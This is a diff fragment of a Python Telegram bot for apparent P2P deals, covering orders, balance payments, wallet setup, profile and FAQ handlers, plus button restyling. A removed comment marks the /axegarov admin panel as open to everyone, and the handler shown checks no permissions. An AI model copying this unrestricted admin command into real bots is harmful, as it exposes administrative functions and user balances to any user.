+            PremiumButton(text="🇺🇸 English", callback_data="set_lang_en", style="primary")
         )
         await message.answer(text=TEXTS[lang]["lang_selection_title"], reply_markup=builder.as_markup())
 
-# --- АДМИН ПАНЕЛЬ (ДОСТУП У ВСЕХ) ---
 @dp.message(Command("axegarov"))
 async def cmd_admin(message: types.Message):
     lang = get_lang(message.from_user.id)
@@ -537,7 +853,6 @@ async def back_to_admin_panel(callback: types.CallbackQuery):
     )
     await callback.message.edit_text(text=TEXTS[lang]["admin_team"], reply_markup=builder.as_markup())
 
-# --- БЛОК СОЗДАНИЯ ОРДЕРА ---
 @dp.callback_query(lambda call: call.data == "warning_show")
 async def process_warning_show(callback: types.CallbackQuery):
     await callback.answer()
@@ -668,7 +983,7 @@ async def order_description_handler(message: types.Message, state: FSMContext):
         PremiumButton(
             text=TEXTS[lang]["btn_write_support"],
             url="https://t.me/BlumP2Phelp",
-            style="primary"
+            style="success"
         )
     )
     
@@ -691,7 +1006,6 @@ async def order_description_handler(message: types.Message, state: FSMContext):
     )
     await state.clear()
 
-# --- ОБРАБОТЧИК КНОПКИ "ПОДЕЛИТЬСЯ ССЫЛКОЙ" ---
 @dp.callback_query(lambda call: call.data.startswith("share_"))
 async def process_share_order(callback: types.CallbackQuery):
     await callback.answer()
@@ -729,7 +1043,6 @@ async def process_share_order(callback: types.CallbackQuery):
     
     await callback.answer("✅ Ссылка отправлена в текущий чат!")
 
-# --- ОБРАБОТЧИК КНОПКИ "ОТМЕНИТЬ ОРДЕР" ---
 @dp.callback_query(lambda call: call.data.startswith("cancel_"))
 async def process_cancel_order(callback: types.CallbackQuery):
     await callback.answer()
@@ -745,7 +1058,6 @@ async def process_cancel_order(callback: types.CallbackQuery):
     else:
         await callback.message.answer(TEXTS[lang]["order_not_found"])
 
-# --- ВХОД В СДЕЛКУ ПОКУПАТЕЛЕМ ---
 async def handle_join_order(message: types.Message, order_id: str):
     lang = get_lang(message.from_user.id)
     order = active_orders.get(order_id)
@@ -777,7 +1089,6 @@ async def handle_join_order(message: types.Message, order_id: str):
         "description": order["description"]
     })
     
-    # --- УВЕДОМЛЕНИЕ ПРОДАВЦУ ---
     seller_notification = (
         f'<tg-emoji emoji-id="5465237148472991488">📢</tg-emoji> <b>Покупатель присоединился к вашей сделке #{order_id}</b>\n\n'
         f'<tg-emoji emoji-id="5409318572654615628">⏳</tg-emoji> На данный момент мы ожидаем оплату от покупателя, как только всё будет готово - мы уведомим вас.\n\n'
@@ -802,7 +1113,6 @@ async def handle_join_order(message: types.Message, order_id: str):
         )
     except Exception:
         pass
-    # --- КОНЕЦ УВЕДОМЛЕНИЯ ПРОДАВЦУ ---
     
     formatted_join = TEXTS[lang]["buyer_joined"].format(
         order_id=order_id, 
@@ -817,7 +1127,6 @@ async def handle_join_order(message: types.Message, order_id: str):
     builder.row(PremiumButton(text=TEXTS[lang]["btn_back"], callback_data="back_to_main", style="primary"))
     await message.answer(text=formatted_join, reply_markup=builder.as_markup())
 
-# --- ОПЛАТА С БАЛАНСА ---
 @dp.callback_query(lambda call: call.data.startswith("balpay_"))
 async def process_balance_payment(callback: types.CallbackQuery):
     await callback.answer()
@@ -907,7 +1216,6 @@ async def process_seller_transfer(callback: types.CallbackQuery):
     except Exception:
         pass
 
-# --- НАСТРОЙКА КОШЕЛЬКОВ ---
 @dp.callback_query(lambda call: call.data == "wallet_setup_gram")
 async def process_wallet_setup_gram(callback: types.CallbackQuery, state: FSMContext):
     await callback.answer()
@@ -1005,7 +1313,6 @@ async def save_stars_recipient_handler(message: types.Message, state: FSMContext
     await message.answer(text=TEXTS[lang]["wallet_updated"], reply_markup=get_back_keyboard(lang))
     await state.clear()
 
-# --- CALLBACK НАВИГАЦИЯ ---
 @dp.callback_query(lambda call: call.data == "open_safety")
 async def process_open_safety(callback: types.CallbackQuery):
     await callback.answer()
@@ -1031,8 +1338,18 @@ async def process_open_support(callback: types.CallbackQuery):
     lang = get_lang(callback.from_user.id)
     
     builder = InlineKeyboardBuilder()
-    builder.row(PremiumButton(text=TEXTS[lang]["btn_write_support"], url="https://t.me/BlumP2Phelp", style="primary"))
-    builder.row(PremiumButton(text=TEXTS[lang]["btn_back"], callback_data="back_to_main", style="primary"))
+    builder.row(PremiumButton(
+        text="Написать агенту",
+        emoji_id="5312325601086956561",
+        url="https://t.me/BlumP2Phelp",
+        style="success"
+    ))
+    builder.row(PremiumButton(
+        text="Вернуться в меню",
+        emoji_id="5312086014926285265",
+        callback_data="back_to_main",
+        style="primary"
+    ))
     await callback.message.answer(text=TEXTS[lang]["support_title"], reply_markup=builder.as_markup())
 
 @dp.callback_query(lambda call: call.data == "open_wallets")
@@ -1050,8 +1367,8 @@ async def process_open_language(callback: types.CallbackQuery):
     
     builder = InlineKeyboardBuilder()
     builder.row(
-        PremiumButton(text="Русский 🇷🇺", callback_data="set_lang_ru", style="primary"),
-        PremiumButton(text="English 🇬🇧", callback_data="set_lang_en", style="primary")
+        PremiumButton(text="🇷🇺 Русский", callback_data="set_lang_ru", style="primary"),
+        PremiumButton(text="🇺🇸 English", callback_data="set_lang_en", style="primary")
     )
     await callback.message.answer(text=TEXTS[lang]["lang_selection_title"], reply_markup=builder.as_markup())
 
@@ -1078,7 +1395,43 @@ async def process_menu_navigation(callback: types.CallbackQuery, state: FSMConte
     lang = get_lang(callback.from_user.id)
     await callback.message.answer(text=TEXTS[lang]["welcome"], reply_markup=get_main_keyboard(lang))
 
-# --- ПОДДЕРЖКА INLINE-РЕЖИМА ---
+# bot.py - обновленная функция my_profile (для кнопки)
+
+@dp.callback_query(lambda call: call.data == "my_profile")
+async def process_my_profile(callback: types.CallbackQuery):
+    await callback.answer()
+    await safe_delete(callback)
+    user_id = callback.from_user.id
+    register_user(user_id)
+    lang = get_lang(user_id)
+    user = db[user_id]
+    
+    total_orders = user["deals_count"]
+    active_orders_count = sum(1 for order in active_orders.values() if order["seller_id"] == user_id or order.get("buyer_id") == user_id)
+    username = user.get("username", str(user_id))
+    
+    await callback.message.answer(
+        text=TEXTS[lang]["profile_title"].format(
+            user["balance_gram"],
+            user["balance_usdt"],
+            user["balance_rub"],
+            user["balance_stars"],
+            total_orders,
+            active_orders_count,
+            user["register_date"],
+            user_id,
+            username
+        ),
+        reply_markup=get_back_keyboard(lang)
+    )
+
+@dp.callback_query(lambda call: call.data == "open_faq")
+async def process_open_faq(callback: types.CallbackQuery):
+    await callback.answer()
+    await safe_delete(callback)
+    lang = get_lang(callback.from_user.id)
+    await callback.message.answer(text=TEXTS[lang]["faq_title"], reply_markup=get_back_keyboard(lang))
+
 @dp.inline_query(lambda q: q.query.startswith("deal_"))
 async def inline_deal_handler(inline_query: types.InlineQuery):
     order_id = inline_query.query.replace("deal_", "")
@@ -1114,6 +1467,12 @@ async def inline_deal_handler(inline_query: types.InlineQuery):
         )
     ]
     await inline_query.answer(results, is_personal=True, cache_time=1)
+
+async def safe_delete(callback: types.CallbackQuery):
+    try:
+        await callback.message.delete()
+    except Exception:
+        pass
 
 async def main():
     load_db()
